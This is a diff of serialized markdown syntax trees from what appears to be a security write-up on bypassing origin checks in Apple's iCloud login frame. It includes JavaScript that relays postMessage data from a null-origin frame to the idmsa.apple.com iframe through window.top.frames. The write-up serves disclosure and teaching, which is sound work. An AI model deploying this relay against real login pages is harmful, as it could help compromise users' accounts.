>                 },
>                 {
>                   "type": "text",
>                   "value": ". So if we try to embed the iCloud login on a ",
>                   "position": {
>                     "start": {
>                       "line": 920,
>                       "column": 186,
>                       "offset": 44474
>                     },
>                     "end": {
>                       "line": 920,
>                       "column": 232,
>                       "offset": 44520
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 920,
>                       "column": 232,
>                       "offset": 44520
>                     },
>                     "end": {
>                       "line": 920,
>                       "column": 238,
>                       "offset": 44526
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " origin ... we won't be able to.",
>                   "position": {
>                     "start": {
>                       "line": 920,
>                       "column": 238,
>                       "offset": 44526
>                     },
>                     "end": {
>                       "line": 920,
>                       "column": 270,
>                       "offset": 44558
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 920,
>                   "column": 1,
>                   "offset": 44289
>                 },
>                 "end": {
>                   "line": 920,
>                   "column": 270,
>                   "offset": 44558
>                 },
>                 "indent": []
>               }
6916,6928c14099,14370
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 385,
<               "column": 1,
<               "offset": 18846
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "We can't make a separate ",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 1,
>                       "offset": 44562
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 26,
>                       "offset": 44587
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 26,
>                       "offset": 44587
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 32,
>                       "offset": 44593
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " frame and also an ",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 32,
>                       "offset": 44593
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 51,
>                       "offset": 44612
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 51,
>                       "offset": 44612
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 68,
>                       "offset": 44629
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " frame and instruct the ",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 68,
>                       "offset": 44629
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 92,
>                       "offset": 44653
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 92,
>                       "offset": 44653
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 98,
>                       "offset": 44659
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " frame to ",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 98,
>                       "offset": 44659
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 108,
>                       "offset": 44669
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 108,
>                       "offset": 44669
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 121,
>                       "offset": 44682
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " to it, because our ",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 121,
>                       "offset": 44682
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 141,
>                       "offset": 44702
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 141,
>                       "offset": 44702
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 147,
>                       "offset": 44708
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " frame needs a reference to the ",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 147,
>                       "offset": 44708
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 179,
>                       "offset": 44740
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 179,
>                       "offset": 44740
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 196,
>                       "offset": 44757
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " frame to call ",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 196,
>                       "offset": 44757
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 211,
>                       "offset": 44772
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.postMessage",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 211,
>                       "offset": 44772
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 231,
>                       "offset": 44792
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " on it.",
>                   "position": {
>                     "start": {
>                       "line": 922,
>                       "column": 231,
>                       "offset": 44792
>                     },
>                     "end": {
>                       "line": 922,
>                       "column": 238,
>                       "offset": 44799
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 922,
>                   "column": 1,
>                   "offset": 44562
>                 },
>                 "end": {
>                   "line": 922,
>                   "column": 238,
>                   "offset": 44799
>                 },
>                 "indent": []
>               }
6930,6933c14372,14439
<             "end": {
<               "line": 385,
<               "column": 18,
<               "offset": 18863
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "There is, however one trick we have up our sleeves, from long ago before nobody knew what the internet is for and you had to install something called 'macromedia flash player' which put a virus on your computer: it's ",
>                   "position": {
>                     "start": {
>                       "line": 924,
>                       "column": 1,
>                       "offset": 44803
>                     },
>                     "end": {
>                       "line": 924,
>                       "column": 218,
>                       "offset": 45020
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.top.frames",
>                   "position": {
>                     "start": {
>                       "line": 924,
>                       "column": 218,
>                       "offset": 45020
>                     },
>                     "end": {
>                       "line": 924,
>                       "column": 237,
>                       "offset": 45039
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 924,
>                       "column": 237,
>                       "offset": 45039
>                     },
>                     "end": {
>                       "line": 924,
>                       "column": 238,
>                       "offset": 45040
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 924,
>                   "column": 1,
>                   "offset": 44803
>                 },
>                 "end": {
>                   "line": 924,
>                   "column": 238,
>                   "offset": 45040
>                 },
>                 "indent": []
>               }
6935,6945c14441,14508
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is consuming something that isn't an HTTP Origin then the\nauthors probably didn't expect what I'm currently doing and (2) since the origin\nisn't extracted from the URL, they're ",
<           "position": {
<             "start": {
<               "line": 385,
<               "column": 18,
<               "offset": 18863
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "If you remember how 'breaking out of iframes' worked before ",
>                   "position": {
>                     "start": {
>                       "line": 926,
>                       "column": 1,
>                       "offset": 45044
>                     },
>                     "end": {
>                       "line": 926,
>                       "column": 61,
>                       "offset": 45104
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "X-Frame-Options",
>                   "position": {
>                     "start": {
>                       "line": 926,
>                       "column": 61,
>                       "offset": 45104
>                     },
>                     "end": {
>                       "line": 926,
>                       "column": 78,
>                       "offset": 45121
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " became a big thing, whenever your page started you'd run code like this:",
>                   "position": {
>                     "start": {
>                       "line": 926,
>                       "column": 78,
>                       "offset": 45121
>                     },
>                     "end": {
>                       "line": 926,
>                       "column": 151,
>                       "offset": 45194
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 926,
>                   "column": 1,
>                   "offset": 45044
>                 },
>                 "end": {
>                   "line": 926,
>                   "column": 151,
>                   "offset": 45194
>                 },
>                 "indent": []
>               }
6947,6950c14510,14531
<             "end": {
<               "line": 387,
<               "column": 39,
<               "offset": 19043
---
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "if (window.top !== window)\n    window.top.location = window.location;",
>               "position": {
>                 "start": {
>                   "line": 928,
>                   "column": 1,
>                   "offset": 45198
>                 },
>                 "end": {
>                   "line": 931,
>                   "column": 4,
>                   "offset": 45288
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
6952,6960d14532
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
6962,6963c14534,14689
<               "type": "text",
<               "value": "validating",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "So if some scallywag embeds my fansite in their other page, thus totally STEALING MY CONTENT -- ",
>                   "position": {
>                     "start": {
>                       "line": 933,
>                       "column": 1,
>                       "offset": 45292
>                     },
>                     "end": {
>                       "line": 933,
>                       "column": 97,
>                       "offset": 45388
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.top",
>                   "position": {
>                     "start": {
>                       "line": 933,
>                       "column": 97,
>                       "offset": 45388
>                     },
>                     "end": {
>                       "line": 933,
>                       "column": 109,
>                       "offset": 45400
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " will be a reference to their page, not my ",
>                   "position": {
>                     "start": {
>                       "line": 933,
>                       "column": 109,
>                       "offset": 45400
>                     },
>                     "end": {
>                       "line": 933,
>                       "column": 152,
>                       "offset": 45443
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window",
>                   "position": {
>                     "start": {
>                       "line": 933,
>                       "column": 152,
>                       "offset": 45443
>                     },
>                     "end": {
>                       "line": 933,
>                       "column": 160,
>                       "offset": 45451
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". In this case, we can set ",
>                   "position": {
>                     "start": {
>                       "line": 933,
>                       "column": 160,
>                       "offset": 45451
>                     },
>                     "end": {
>                       "line": 933,
>                       "column": 187,
>                       "offset": 45478
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.top.location",
>                   "position": {
>                     "start": {
>                       "line": 933,
>                       "column": 187,
>                       "offset": 45478
>                     },
>                     "end": {
>                       "line": 933,
>                       "column": 208,
>                       "offset": 45499
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " to our ",
>                   "position": {
>                     "start": {
>                       "line": 933,
>                       "column": 208,
>                       "offset": 45499
>                     },
>                     "end": {
>                       "line": 933,
>                       "column": 216,
>                       "offset": 45507
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.location",
>                   "position": {
>                     "start": {
>                       "line": 933,
>                       "column": 216,
>                       "offset": 45507
>                     },
>                     "end": {
>                       "line": 933,
>                       "column": 233,
>                       "offset": 45524
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " redirecting the bastards to my fansite for x86 intel instructions.",
>                   "position": {
>                     "start": {
>                       "line": 933,
>                       "column": 233,
>                       "offset": 45524
>                     },
>                     "end": {
>                       "line": 933,
>                       "column": 300,
>                       "offset": 45591
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
6966,6968c14692,14694
<                   "line": 387,
<                   "column": 40,
<                   "offset": 19044
---
>                   "line": 933,
>                   "column": 1,
>                   "offset": 45292
6971,6973c14697,14699
<                   "line": 387,
<                   "column": 50,
<                   "offset": 19054
---
>                   "line": 933,
>                   "column": 300,
>                   "offset": 45591
6977,6983d14702
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 387,
<               "column": 39,
<               "offset": 19043
6985,6988c14704,14822
<             "end": {
<               "line": 387,
<               "column": 51,
<               "offset": 19055
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "inlineCode",
>                   "value": "window.top",
>                   "position": {
>                     "start": {
>                       "line": 935,
>                       "column": 1,
>                       "offset": 45595
>                     },
>                     "end": {
>                       "line": 935,
>                       "column": 13,
>                       "offset": 45607
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " has another legacy feature -- ",
>                   "position": {
>                     "start": {
>                       "line": 935,
>                       "column": 13,
>                       "offset": 45607
>                     },
>                     "end": {
>                       "line": 935,
>                       "column": 44,
>                       "offset": 45638
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.top.frames",
>                   "position": {
>                     "start": {
>                       "line": 935,
>                       "column": 44,
>                       "offset": 45638
>                     },
>                     "end": {
>                       "line": 935,
>                       "column": 63,
>                       "offset": 45657
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". ",
>                   "position": {
>                     "start": {
>                       "line": 935,
>                       "column": 63,
>                       "offset": 45657
>                     },
>                     "end": {
>                       "line": 935,
>                       "column": 65,
>                       "offset": 45659
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.top.frames",
>                   "position": {
>                     "start": {
>                       "line": 935,
>                       "column": 65,
>                       "offset": 45659
>                     },
>                     "end": {
>                       "line": 935,
>                       "column": 84,
>                       "offset": 45678
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is a reference to every frame embedded in the top window, including us (if we're embedded there).",
>                   "position": {
>                     "start": {
>                       "line": 935,
>                       "column": 84,
>                       "offset": 45678
>                     },
>                     "end": {
>                       "line": 935,
>                       "column": 182,
>                       "offset": 45776
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 935,
>                   "column": 1,
>                   "offset": 45595
>                 },
>                 "end": {
>                   "line": 935,
>                   "column": 182,
>                   "offset": 45776
>                 },
>                 "indent": []
>               }
6990,7000c14824,15180
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " the URL rather than\n",
<           "position": {
<             "start": {
<               "line": 387,
<               "column": 51,
<               "offset": 19055
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "So if we embed both ",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 1,
>                       "offset": 45780
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 21,
>                       "offset": 45800
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 21,
>                       "offset": 45800
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 27,
>                       "offset": 45806
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " and ",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 27,
>                       "offset": 45806
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 32,
>                       "offset": 45811
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 32,
>                       "offset": 45811
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 50,
>                       "offset": 45829
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " in the same page that we control, we can pass the index of ",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 50,
>                       "offset": 45829
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 110,
>                       "offset": 45889
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 110,
>                       "offset": 45889
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 128,
>                       "offset": 45907
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " to the ",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 128,
>                       "offset": 45907
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 136,
>                       "offset": 45915
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 136,
>                       "offset": 45915
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 142,
>                       "offset": 45921
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " page over ",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 142,
>                       "offset": 45921
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 153,
>                       "offset": 45932
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 153,
>                       "offset": 45932
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 166,
>                       "offset": 45945
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". Then, when we want to send a message to ",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 166,
>                       "offset": 45945
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 208,
>                       "offset": 45987
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 208,
>                       "offset": 45987
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 226,
>                       "offset": 46005
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", we can ",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 226,
>                       "offset": 46005
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 235,
>                       "offset": 46014
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 235,
>                       "offset": 46014
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 248,
>                       "offset": 46027
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " the message to our ",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 248,
>                       "offset": 46027
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 268,
>                       "offset": 46047
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 268,
>                       "offset": 46047
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 274,
>                       "offset": 46053
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " origin and have it proxy it to ",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 274,
>                       "offset": 46053
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 306,
>                       "offset": 46085
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 306,
>                       "offset": 46085
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 324,
>                       "offset": 46103
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " at ",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 324,
>                       "offset": 46103
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 328,
>                       "offset": 46107
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.top.frames[index]",
>                   "position": {
>                     "start": {
>                       "line": 937,
>                       "column": 328,
>                       "offset": 46107
>                     },
>                     "end": {
>                       "line": 937,
>                       "column": 354,
>                       "offset": 46133
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 937,
>                   "column": 1,
>                   "offset": 45780
>                 },
>                 "end": {
>                   "line": 937,
>                   "column": 354,
>                   "offset": 46133
>                 },
>                 "indent": []
>               }
7002,7005c15182,15204
<             "end": {
<               "line": 388,
<               "column": 1,
<               "offset": 19077
---
>             {
>               "type": "code",
>               "lang": null,
>               "meta": null,
>               "value": "graph TD;\n    op[\"our page\"] --index of idmsa.apple.com--> null;\n    op --> idmsa.apple.com",
>               "position": {
>                 "start": {
>                   "line": 939,
>                   "column": 1,
>                   "offset": 46137
>                 },
>                 "end": {
>                   "line": 943,
>                   "column": 4,
>                   "offset": 46240
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
7007,7014d15205
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
7016,7017c15207,15328
<               "type": "text",
<               "value": "transforming",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Our ",
>                   "position": {
>                     "start": {
>                       "line": 945,
>                       "column": 1,
>                       "offset": 46244
>                     },
>                     "end": {
>                       "line": 945,
>                       "column": 5,
>                       "offset": 46248
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "nullPageCode",
>                   "position": {
>                     "start": {
>                       "line": 945,
>                       "column": 5,
>                       "offset": 46248
>                     },
>                     "end": {
>                       "line": 945,
>                       "column": 19,
>                       "offset": 46262
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " waits for a config indicating what the index of ",
>                   "position": {
>                     "start": {
>                       "line": 945,
>                       "column": 19,
>                       "offset": 46262
>                     },
>                     "end": {
>                       "line": 945,
>                       "column": 68,
>                       "offset": 46311
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 945,
>                       "column": 68,
>                       "offset": 46311
>                     },
>                     "end": {
>                       "line": 945,
>                       "column": 85,
>                       "offset": 46328
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is on ",
>                   "position": {
>                     "start": {
>                       "line": 945,
>                       "column": 85,
>                       "offset": 46328
>                     },
>                     "end": {
>                       "line": 945,
>                       "column": 92,
>                       "offset": 46335
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.top.frames",
>                   "position": {
>                     "start": {
>                       "line": 945,
>                       "column": 92,
>                       "offset": 46335
>                     },
>                     "end": {
>                       "line": 945,
>                       "column": 111,
>                       "offset": 46354
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", and then forwards any message it gets to that index:",
>                   "position": {
>                     "start": {
>                       "line": 945,
>                       "column": 111,
>                       "offset": 46354
>                     },
>                     "end": {
>                       "line": 945,
>                       "column": 165,
>                       "offset": 46408
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
7020,7022c15331,15333
<                   "line": 388,
<                   "column": 2,
<                   "offset": 19078
---
>                   "line": 945,
>                   "column": 1,
>                   "offset": 46244
7025,7027c15336,15338
<                   "line": 388,
<                   "column": 14,
<                   "offset": 19090
---
>                   "line": 945,
>                   "column": 165,
>                   "offset": 46408
7030a15342,15398
>             },
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "    const nullPageCode = () => {\n\n      // wait for config\n\n\n      async function main() {\n\n        window.parent.postMessage(\"ready\", \"*\");\n        const config = await new Promise((ok, fail) => {\n\n          console.log(\"waiting for config...\")\n\n          window.addEventListener(\"message\", ({ data }) => {\n\n            console.log(\"got config message\");\n\n            if (data.type !== \"config\") return fail(`did not get config, instead got ${JSON.stringify(data)}`);\n\n            return ok(data);\n          }, { once: true })\n\n        });\n\n        console.log({ config });\n        console.log(\"now any data the null origin gets is sent to the icloud iframe...\");\n\n        window.addEventListener(\"message\", ({ data }) => {\n          console.log(\"forwarding to idmsa\", data)\n          window.top.frames[config.idmsaFrameId].postMessage(data, \"*\");\n        });\n      }\n\n\n      main().catch(e => console.error(e))\n\n    }",
>               "position": {
>                 "start": {
>                   "line": 946,
>                   "column": 1,
>                   "offset": 46410
>                 },
>                 "end": {
>                   "line": 983,
>                   "column": 4,
>                   "offset": 47384
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
7033,7061c15401,15402
<           "position": {
<             "start": {
<               "line": 388,
<               "column": 1,
<               "offset": 19077
<             },
<             "end": {
<               "line": 388,
<               "column": 15,
<               "offset": 19091
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " it.",
<           "position": {
<             "start": {
<               "line": 388,
<               "column": 15,
<               "offset": 19091
<             },
<             "end": {
<               "line": 388,
<               "column": 19,
<               "offset": 19095
<             },
<             "indent": []
---
>           "data": {
>             "hName": "section"
7063,7074d15403
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 384,
<           "column": 1,
<           "offset": 18776
<         },
<         "end": {
<           "line": 388,
<           "column": 19,
<           "offset": 19095
7076,7086d15404
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
7088,7094c15406,15445
<           "type": "text",
<           "value": "Transformation rather than validation is something I personally try to push a\nlot. Almost always in a system, one's own understanding of everything about the\ntechnology you're working with is incomplete. For example, here the authors of\nthe Apple ID login system didn't know about this URL syntax. If we ",
<           "position": {
<             "start": {
<               "line": 390,
<               "column": 1,
<               "offset": 19099
---
>           "type": "section",
>           "depth": 2,
>           "children": [
>             {
>               "type": "heading",
>               "depth": 2,
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "It's Not Always That You Need to Read The Spec, But That Always is Today.",
>                   "position": {
>                     "start": {
>                       "line": 986,
>                       "column": 1,
>                       "offset": 47390
>                     },
>                     "end": {
>                       "line": 986,
>                       "column": 74,
>                       "offset": 47463
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 986,
>                   "column": 1,
>                   "offset": 47390
>                 },
>                 "end": {
>                   "line": 987,
>                   "column": 67,
>                   "offset": 47531
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
7096,7099c15447,15465
<             "end": {
<               "line": 393,
<               "column": 68,
<               "offset": 19406
---
>             {
>               "type": "definition",
>               "identifier": "it's not always that you need to read the spec, but that always is today.",
>               "label": "It's Not Always That You Need to Read The Spec, But That Always is Today.",
>               "title": null,
>               "url": "#its-not-always-that-you-need-to-read-the-spec-but-that-always-is-today",
>               "position": {
>                 "start": {
>                   "line": 988,
>                   "column": 1,
>                   "offset": 47533
>                 },
>                 "end": {
>                   "line": 988,
>                   "column": 149,
>                   "offset": 47681
>                 },
>                 "indent": []
>               }
7101,7110d15466
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
7112,7113c15468,15472
<               "type": "text",
<               "value": "transform",
---
>               "type": "definition",
>               "identifier": "§8",
>               "label": "§8",
>               "title": null,
>               "url": "#its-not-always-that-you-need-to-read-the-spec-but-that-always-is-today",
7116,7118c15475,15477
<                   "line": 393,
<                   "column": 69,
<                   "offset": 19407
---
>                   "line": 989,
>                   "column": 1,
>                   "offset": 47683
7121c15480
<                   "line": 393,
---
>                   "line": 989,
7123c15482
<                   "offset": 19416
---
>                   "offset": 47760
7127,7201d15485
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 393,
<               "column": 68,
<               "offset": 19406
<             },
<             "end": {
<               "line": 393,
<               "column": 79,
<               "offset": 19417
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "\nthe inputs we get including only the information we expect and understand, we\nstrip out a lot of potential for esoteric functionality to bypass our security\ncontrols.",
<           "position": {
<             "start": {
<               "line": 393,
<               "column": 79,
<               "offset": 19417
<             },
<             "end": {
<               "line": 396,
<               "column": 10,
<               "offset": 19587
<             },
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 390,
<           "column": 1,
<           "offset": 19099
<         },
<         "end": {
<           "line": 396,
<           "column": 10,
<           "offset": 19587
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
